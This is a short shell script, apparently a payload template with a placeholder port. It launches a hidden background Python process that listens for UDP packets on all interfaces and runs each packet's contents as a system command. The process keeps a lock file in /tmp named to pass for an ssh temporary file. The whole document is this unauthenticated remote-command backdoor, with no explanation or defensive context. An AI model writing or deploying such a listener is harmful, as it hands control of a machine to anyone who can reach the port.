#!/bin/sh
python - <<EOF &
lock = "/tmp/ssh-o1Lonxx7lmaa"
import os
import socket
if os.path.isfile(lock):
    exit()
file(lock, 'w').write('1')
SERVER_HOST = '0.0.0.0'
SERVER_PORT = VAR_TARGET_PORT
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.bind((SERVER_HOST, SERVER_PORT))
while True:
    received, addr = sock.recvfrom(1024)
    received = received.decode()
    if received == 'done\n':
        break
    os.system(received)
os.unlink(lock)
EOF
